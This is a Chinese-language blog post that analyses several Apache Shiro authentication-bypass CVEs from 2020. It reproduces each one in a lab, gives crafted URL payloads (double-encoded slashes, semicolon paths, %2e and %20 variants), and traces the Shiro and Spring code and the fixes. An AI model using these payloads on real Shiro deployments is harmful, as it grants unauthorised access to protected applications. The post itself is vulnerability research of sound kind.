<h2 id="shiro文件方面科普"><a href="#shiro文件方面科普" class="headerlink" title="shiro文件方面科普"></a>shiro文件方面科普</h2><p>Shiro主要的三个文件：<br>ShiroConfig，LoginController，Myrealm</p>
<p>权限配置：ShiroConfig<br>其中/doLogin无需权限验证即可访问，用于登录界面<br>而test/文件下目录需要登陆权限认证后才可以进行访问</p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240212143229567.png" alt="image-20240212143229567"></p>
<p>登陆控制：LoginController<br>其中设置了访问目录返回的内容</p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240212143248394.png" alt="image-20240212143248394"></p>
<p>Myrealm：其中储存着用户类信息像我们登陆所用的密码。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240212143303608.png" alt="image-20240212143303608"></p>
<h2 id="漏洞分析-——-两次解码绕过"><a href="#漏洞分析-——-两次解码绕过" class="headerlink" title="漏洞分析 —— 两次解码绕过"></a>漏洞分析 —— 两次解码绕过</h2><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>这个场景下需要一些限制条件，首先配置文件的<code>ant</code>风格需要是<code>*</code>而不是<code>**</code>，测试发现，<code>?</code>也可以<br>另外<code>controller</code>需要接收的<code>request</code>参数(<code>@PathVariable</code>)的类型需要是<code>String</code>，否则将会出错。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/24cfe3e3-0cd5-4435-8e2c-2bd4e8ab6ff5.png" alt="11989_3.png"></p>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>首先复现一下，测试版本 <code>1.5.2</code>。</p>
<p>编写<code>Controller</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/toJsonList/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">toJsonList</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;返回json集合数据&quot;</span>);</span><br><span class="line">    User user1 = <span class="keyword">new</span> User();</span><br><span class="line">    user1.setName(<span class="string">&quot;alter1&quot;</span>);</span><br><span class="line">    user1.setAge(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    User user2 = <span class="keyword">new</span> User();</span><br><span class="line">    user2.setName(<span class="string">&quot;alter2&quot;</span>);</span><br><span class="line">    user2.setAge(<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; userList = <span class="keyword">new</span> ArrayList&lt;User&gt;();</span><br><span class="line">    userList.add(user1);</span><br><span class="line">    userList.add(user2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> userList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置对应的<code>shiro.ini</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">/toJsonList/* = authc</span><br></pre></td></tr></table></figure>

<p>此时请求<code>/toJsonList/aaa</code>那么将会被禁止。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1229aa7f-faf3-49f4-9f0e-9663b58f25dd.png" alt="11989_1.png"><br>但是这里我们可以通过url双编码的方式来绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ -&gt; %2f -&gt;%25%32%66</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/71a12129-473c-4d67-8f95-a36ca2478c54.png" alt="11989_2.png"><br>测试发现下面四种组合只有前两组可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yes</span><br><span class="line">/toJsonList/a%25%32%66a</span><br><span class="line">/toJsonList/%25%32%66</span><br><span class="line"></span><br><span class="line">no</span><br><span class="line">/toJsonList/%25%32%66a</span><br><span class="line">/toJsonList/a%25%32%66</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先要清楚<code>Shiro</code>支持 <code>Ant</code> 风格的路径表达式配置。<code>ANT</code> 通配符有 <code>3</code> 种，如下所示：</p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>?</td>
<td>匹配任何单字符</td>
</tr>
<tr>
<td>*</td>
<td>匹配0或者任意数量的字符</td>
</tr>
<tr>
<td>**</td>
<td>匹配0或者更多的目录</td>
</tr>
</tbody></table>
<p>解释一下就是<code>/**</code> 之类的配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：<code>/admin/**</code> 可以匹配 <code>/admin/a</code> 或者 <code>/admin/b/c/d</code> 等请求。<br>对于<code>/*</code>的话 ，单个 <code>*</code> 不能跨目录，只能在两个 <code>/</code> 之间匹配任意数量的字符，如 <code>/admin/*</code> 可以匹配 <code>/admin/a</code> 但是不能匹配 <code>/admin/b/c/d</code>。<br>那么问题来了，如果我们将其配置为<code>/toJsonList/*</code>，但是我们访问形如<code>/toJsonList/a/b</code>这种路径，此时就会绕过访问权限。</p>
<p>我们还记得为了修复<code>CVE-2020-1957</code>,shiro在<code>1.5.2</code>版本进行了更新，将<code>request.getRequestURI()</code> 修改为 <code>request.getContextPath()</code>、<code>request.getServletPath()</code>、<code>request.getPathInfo()</code> 拼接构造<code>uri</code>。根据网上师傅们的总结，这几个方法的差异性如下：</p>
<ul>
<li><code>request.getRequestURL()</code>：返回全路径；</li>
<li><code>request.getRequestURI()</code>：返回除去<code>Host</code>部分的路径；</li>
<li><code>request.getContextPath()</code>：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li>
<li><code>request.getServletPath()</code>：返回除去<code>Host</code>和工程名部分的路径；</li>
<li><code>request.getPathInfo()</code>：仅返回传递到<code>Servlet</code>的路径，如果没有传递额外的路径信息，则此返回<code>Null</code>；</li>
</ul>
<p>第一次解码发生在<code>request.getServletPath()</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4c0b04be-0117-43bb-932f-472e4a30776f.png" alt="11989_4.png"><br>第二次解码发生在<code>decodeAndCleanUriString()</code> -&gt; <code>decodeAndCleanUriString()</code> -&gt; <code>decodeRequestString()</code> -&gt; <code>URLDecoder.decode()</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9dea126c-6270-414a-afb6-2ac7f89ed188.png" alt="11989_5.png"><br>因此<code>org.apache.shiro.web.util.WebUtils#getRequestUri</code>进行了两次解码，将<code>/toJsonList/a%25%32%66a</code>解码成<code>/toJsonList/a/a</code><br>接着就走到<code>org.apache.shiro.util.AntPathMatcher#doMatch</code>进行权限验证，<code>/toJsonList/a/a</code>不满足配置中的<code>toJsonList/*</code>，因此成功绕过。</p>
<p>但还要看<code>Spring</code>是怎么对其进行解析的<br>在<code>org.springframework.web.uti.UrlPathHelper#getPathWithinApplication</code>中，将<code>url</code>解析为<code>/toJsonList/a%2fa</code>，这样其实就表示<code>/toJsonList/&#123;name&#125;</code>中的<code>name</code>值为<code>a%2fa</code>。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01c766fa-0180-406e-8f1f-09ea185e72a7.png" alt="11989_6.png"></p>
<p>分析完之后， 也就解释了为什么下面四种组合只有前两组可以绕过<br>（这种二次解码的方式我测试只适用于<code>1.5.2</code>的版本，之前的版本使用<code>a%25%32%66a</code>测试，因为只有一次解码，会跳转至登陆界面；<code>a%2fa</code>测试直接返回<code>400 Bad Request</code>）</p>
<h2 id="漏洞分析-——-根路径差异化解析绕过"><a href="#漏洞分析-——-根路径差异化解析绕过" class="headerlink" title="漏洞分析 —— 根路径差异化解析绕过"></a>漏洞分析 —— 根路径差异化解析绕过</h2><h3 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h3><ol>
<li>若 <code>Shiro &gt;= 1.5.2</code> 的话，应用不能部署在根目录，如果为根目录则 <code>context-path</code> 为空， <code>CVE-2020-1957</code> 更新补丁将 <code>URL</code> 格式化。</li>
<li><code>Spring</code> 控制器中没有另外的权限校验代码</li>
</ol>
<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>本次复现使用的是<code>1.4.2</code>版本的<code>shiro</code>所以应用根目录是什么都没有关系</p>
<p>配置为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/alter/* = authc</span><br><span class="line">/** = anon</span><br></pre></td></tr></table></figure>

<p>新增一个<code>controller</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;/alter/test&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public List&lt;User&gt; test()&#123;</span><br><span class="line">    User user1 = new User();</span><br><span class="line">    user1.setName(&quot;alter&quot;);</span><br><span class="line">    user1.setAge(15);</span><br><span class="line">    List&lt;User&gt; userList = new ArrayList&lt;User&gt;();</span><br><span class="line">    userList.add(user1);</span><br><span class="line">    return userList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入地址<code>http://localhost:8080/;/shirodemo/alter/test</code>，<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>会进行如下操作获取<code>uri</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fca0343a-8a78-4f34-aea1-2198d53d145c.png" alt="11989_7.png"><br>此时<code>uri</code>结果为<code>/</code>，绕过配置<code>/alter/* = authc</code>，符合配置<code>/** = anon</code>，达到绕过目的。<br><code>Spring</code>在处理<code>uri</code>时直接进行路径标准化，去掉了分号</p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8966db39-0bba-4dab-862b-586cd95db325.png" alt="11989_13.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2b959507-a4e9-4502-b232-cbc2fe0edb67.png" alt="11989_8.png"><br><code>Shiro &lt; 1.5.2</code>版本的话，根路径是什么没有关系<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/d1ad8ac4-f4fe-4a7c-a183-d02b868652c9.png" alt="11989_9.png"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><code>Shiro</code> 在 <a href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit</a> 中修改了 <code>URL</code> 获取的逻辑，不单独处理 <code>context-path</code>，这样不会导致绕过，同时也避免了二次 URL 解码的问题。<br>回退了 <code>WebUtils#getRequestUri</code> 的代码，并将其标记为 <code>@Deprecated</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/a832f275-890a-4fb9-aaba-9417ff16bdea.png" alt="11989_10.png"><br>可以看到，<code>shiro</code>建议使用 <code>getPathWithinApplication()</code> 方法获取路径减去上下文路径，或直接调用 <code>HttpServletRequest.getRequestURI()</code> 方法获取。</p>
<p>在 <code>WebUtils#getPathWithinApplication</code> 方法，修改了使用 <code>RequestUri</code> 去除 <code>ContextPath</code> 的方式，改为使用 <code>getServletPath(request) + getPathInfo(request))</code>。然后使用 <code>removeSemicolon</code> 方法处理分号问题，<code>normalize</code> 方法进行路径标准化。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/bb954aaf-9946-4802-a236-2f81e5a75852.png" alt="11989_11.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0fa52d4d-a396-4b46-978b-7af72f88f44f.png" alt="11989_12.png"></p>
<h2 id="Shiro-lt-1-6-0-验证绕过漏洞-CVE-2020-13933"><a href="#Shiro-lt-1-6-0-验证绕过漏洞-CVE-2020-13933" class="headerlink" title="Shiro &lt; 1.6.0 验证绕过漏洞 CVE-2020-13933"></a>Shiro &lt; 1.6.0 验证绕过漏洞 CVE-2020-13933</h2><h3 id="漏洞信息-5"><a href="#漏洞信息-5" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13933">CVE-2020-13933</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-46579">CNVD-2020-46579</a><br>影响版本：<code>shiro &lt; 1.6.0</code><br>漏洞描述：<code>Shiro</code> 由于处理身份验证请求时存在权限绕过漏洞，特制的<code>HTTP</code>请求可以绕过身份验证过程并获得对应用程序的未授权访问。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit</a></p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个CVE其实就是对<code>CVE-2020-11989 patch</code>的绕过。上一个CVE使用 <code>getServletPath(request) + getPathInfo(request))</code> 获取<code>uri</code>，回顾一下：</p>
<ul>
<li><code>request.getServletPath()</code>：返回除去<code>Host</code>和工程名部分的路径；</li>
<li><code>request.getPathInfo()</code>：仅返回传递到<code>Servlet</code>的路径，如果没有传递额外的路径信息，则此返回<code>Null</code>；</li>
</ul>
<p><code>Shiro</code>在<code>getChain</code>内进行权限验证，首先通过<code>getPathWithinApplication(request)</code>获得<code>uri</code>。从下图可以看到，更新后使用<code>HttpServletRequest.getRequestURI()</code> 方法获取<code>uri</code>；然后使用<code>removeSemicolon</code>去除<code>uri</code>中的分号，这里去除的是分号及分号后面的内容；然后使用<code>normalize</code>进行路径标准化。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/075924a4-76d5-4c72-a748-b3adeeff01cc.png" alt="13933_1.png"><br>此时得到的路径为<code>/hello</code>，绕过了配置中的权限。<br>接着看<code>Spring</code>是怎么处理路径的：<br>在<code>org.springframework.web.util#UrlPathHelper</code>中的<code>getPathWithinApplication</code>方法内，使用<code>getRequestUri(request)</code>方法获取<code>uri</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3b920411-1254-4e52-baaf-c6883c3df102.png" alt="13933_2.png"><br>与<code>Shiro</code>处理的差异达到既绕过<code>Shiro</code>权限验证又成功访问的目的。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/266ce163-9482-40d8-ba9c-879ed583068b.png" alt="13933_3.png"></p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><code>shiro</code>在<code>1.6.0</code>版本中，<code>org.apache.shiro.spring.web#ShiroFilterFactoryBean</code>中增加了<code>/**</code>的默认路径配置，使其可以全局匹配进行过滤校验<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/34a3faa0-b584-4ed9-adb8-2bbadd85d5a9.png" alt="13933_4.png"><br>默认的<code>/**</code>配置对应一个全局的 <code>filter</code>：<code>InvalidRequestFilter</code>，这个类继承了 <code>AccessControlFilter</code>。用来过滤特殊字符（分号、反斜线、非ASCII码字符)，并返回 <code>400</code> 状态码。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/89cfe6df-bb53-417e-9316-45a578c57672.png" alt="13933_5.png"></p>
<h2 id="Apache-Shiro-lt-1-7-0-权限绕过漏洞-CVE-2020-17510"><a href="#Apache-Shiro-lt-1-7-0-权限绕过漏洞-CVE-2020-17510" class="headerlink" title="Apache Shiro &lt; 1.7.0 权限绕过漏洞 CVE-2020-17510"></a>Apache Shiro &lt; 1.7.0 权限绕过漏洞 CVE-2020-17510</h2><h3 id="漏洞信息-6"><a href="#漏洞信息-6" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17510">CVE-2020-17510</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-60318">CNVD-2020-60318</a><br>影响版本：<code>shiro &lt; 1.7.0</code><br>漏洞描述：第三种<code>AntPathMatcher</code>的绕过方式<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit</a></p>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞还是对 <code>AntPathMatcher</code> 的继续绕过,在<code>CVE-2020-11989</code>和<code>CVE-2020-13933</code>分别尝试了 <code>/</code> 的双重 <code>URL</code> 编码和 <code>;</code> 的 <code>URL</code> 编码绕过，归根到底这种方式还是因为<code>Shiro</code>与<code>Spring</code>对<code>URI</code>处理的差异化导致的。那么字符 <code>.</code> 是不是也可以进行绕过呢？其实是可以的（测试环境<code>Shiro 1.6.0</code>，<code>SpringBoot 2.5.3</code>）<br>还是添加如下配置和<code>Controller</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(&quot;/hello/*&quot;, &quot;authc&quot;);</span><br><span class="line">@GetMapping(&quot;/hello/&#123;name&#125;&quot;)</span><br><span class="line">public String hello(@PathVariable String name) &#123;</span><br><span class="line">    return &quot;hello&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>Shiro</code>获得的<code>uri</code>为<code>/hello</code>时，是无法和<code>/hello/*</code>匹配的，所以就在<code>/hello</code>后面加上<code>%2e</code>，这样<code>Shiro</code>解码之后变成<code>/hello/.</code>，然后路径标准化成为<code>/hello</code>，绕过身份验证<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/77129164-368e-4fc2-9053-83c97815cabe.png" alt="17510_1.png"><br>对于<code>Spring</code>来说，正如之前讲的，<code>Spring Boot</code> 版本在小于等于 <code>2.3.0.RELEASE</code>时，会对<code>uri</code>进行解码然后路径标准化，这样得到的路径为<code>/hello</code>，没有页面与之匹配。所以只有当 <code>Spring Boot</code> 版本在大于 <code>2.3.0.RELEASE</code>时标准化路径后<code>/hello/%2e</code>，然后解码<code>/hello/.</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/eaaf40a6-dd1e-4ee1-a594-f3840ed1853b.png" alt="17510_2.png"><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/83a4c3a1-f1dc-401a-92f8-8fe465c71d14.png" alt="17510_3.png"><br>下面的<code>payload</code>都可以使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%2e</span><br><span class="line">/%2e/</span><br><span class="line">/%2e%2e</span><br><span class="line">/%2e%2e/</span><br></pre></td></tr></table></figure>

<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在<a href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit</a>中发现<code>org.apache.shiro.spring.web</code>下新增了<code>ShiroUrlPathHelper</code>类，属于<code>UrlPathHelper</code>的子类，重写了<code>getPathWithinApplication</code>和<code>getPathWithinServletMapping</code>两个方法<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/59618d48-d1aa-406f-98ef-ccd414adf631.png" alt="17510_4.png"></p>
<p>其实我认为<code>1.7.1</code>才算真正的更新，因为它是依次对原<code>uri</code>和去除<code>uri</code>尾部斜线的<code>uri</code>进行验证，这样就可以避免因直接去除尾部<code>uri</code>导致<code>/hello</code>和<code>/hello/*</code>不匹配而导致的绕过问题。</p>
<h3 id="补丁问题"><a href="#补丁问题" class="headerlink" title="补丁问题"></a>补丁问题</h3><h4 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h4><p>根据官方发布的公告，发现其实需要配置<code>shiro-spring-boot-web-starter</code>才有效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> if you are NOT using Shiro’s Spring Boot Starter</span><br><span class="line">(`shiro-spring-boot-web-starter`), you must configure add the</span><br><span class="line">ShiroRequestMappingConfig auto configuration[1] to your application or</span><br><span class="line">configure the equivalent manually[2].</span><br><span class="line">[1] https://shiro.apache.org/spring-framework.html#SpringFramework-WebConfig</span><br><span class="line">[2]https://github.com/apache/shiro/blob/shiro-root-1.7.0/support/spring/src/main/java/org/apache/shiro/spring/web/config/ShiroRequestMappingConfig.java#L28-L30</span><br></pre></td></tr></table></figure>

<p>由于我导入的<code>dependency</code>如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.6.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.6.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>如果直接将版本升为<code>1.7.0</code>的话，其实并没有触发更新，原<code>payload</code>还是可以绕过。<br>只有按照上面官网所述的两种配置方式修改后，才能防御成功</p>
<h4 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h4><p>在旧版的SpringBoot 中，当我们需要获取当前请求地址的时候，直接通过如下方式获取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//org.springframework.web.servlet.handler#getHandlerInternal</span><br><span class="line">String lookupPath = this.getUrlPathHelper().getLookupPathForRequest(request);</span><br></pre></td></tr></table></figure>

<p>但是在新版Spring里边，通过如下方式获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String lookupPath = this.initLookupPath(request);</span><br></pre></td></tr></table></figure>

<p>initLookupPath()代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected String initLookupPath(HttpServletRequest request) &#123;</span><br><span class="line">    if (this.usesPathPatterns()) &#123;</span><br><span class="line">        request.removeAttribute(UrlPathHelper.PATH_ATTRIBUTE);</span><br><span class="line">        RequestPath requestPath = ServletRequestPathUtils.getParsedRequestPath(request);</span><br><span class="line">        String lookupPath = requestPath.pathWithinApplication().value();</span><br><span class="line">        return UrlPathHelper.defaultInstance.removeSemicolonContent(lookupPath);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return this.getUrlPathHelper().resolveAndCacheLookupPath(request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>this.usesPathPatterns() == true</code>的话，就可以绕开问题一中我们配置的<code>ShiroUrlPathHelper</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/f4f79345-9138-491a-b9be-720628aaef78.png" alt="17510_5.png"><br>此时也成功绕过。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0fbc3ffd-bfa8-4682-a466-bbcf90936c13.png" alt="17510_6.png"></p>
<p>所以这就存在一个矛盾：只有<code>Spring Boot</code> 版本在大于 <code>2.3.0.RELEASE</code>才能触发这个漏洞，修复之后由于版本问题，<code>SpringBoot</code>又不走那条语句。<br>另外在配置的时候，当<code>Spring Boot</code> 版本在小于等于 <code>2.3.0.RELEASE</code>，如<code>2.1.5.RELEASE</code>，时，<code>this.getUrlPathHelper()</code>并不是<code>ShiroUrlPathHelper</code>，不清楚是不是配置问题还是版本兼容问题。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/cdc33956-ce25-4254-8a35-df7dabdc9298.png" alt="17510_7.png"></p>
<h2 id="Apache-Shiro-lt-1-7-1-权限绕过漏洞CVE-2020-17523"><a href="#Apache-Shiro-lt-1-7-1-权限绕过漏洞CVE-2020-17523" class="headerlink" title="Apache Shiro &lt; 1.7.1 权限绕过漏洞CVE-2020-17523"></a>Apache Shiro &lt; 1.7.1 权限绕过漏洞CVE-2020-17523</h2><h3 id="漏洞信息-7"><a href="#漏洞信息-7" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523">CVE-2020-17523</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-09492">CNVD-2021-09492</a><br>影响版本：<code>shiro &lt; 1.7.1</code><br>漏洞描述：<code>Shiro 1.7.1</code> 之前的版本，在将 <code>Shiro</code> 与 <code>Spring</code> 结合使用时，特制的 <code>HTTP</code> 请求可能会导致身份验证绕过。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160#diff-ce9ba3462f7d76e68c79bec5b9a3aea9bbd0d22ffb5e738f1b621cae49037b92">Commit</a></p>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>如<code>CVE-2020-17510</code>那样，这个漏洞可以使用空格<code>%20</code>进行绕过。<br>我们输入路径为<code>http://localhost:8080/hello/%20</code>，进入<code>getChain</code>，经过路径获取后要进行权限的匹配与验证<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5aa36ec1-8ecb-4b24-a4dc-8310b3ab2a82.png" alt="17523_1.png"><br>这里主要看一下<code>/hello/</code>和<code>/hello/*</code>比较时发生了什么<br>经过<code>pathMatches(pathPattern, requestURI)</code> -&gt; <code>pathMatcher.matches(pattern, path)</code> -&gt; <code>match(pattern, source)</code> -&gt; <code>doMatch(pattern, path, true)</code> 来到了主要的判断方法<code>doMatch()</code>。<br>其中<code>StringUtils.tokenizeToStringArray()</code>方法是将它的参数，也就是传进来的两个路径拆解成字符串数组，然后进行比较。<br>进入方法，可以看到当对空格进行转换时，直接<code>trim</code>为空<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17fd3389-2633-4d6d-97be-32381199a796.png" alt="17523_2.png"></p>
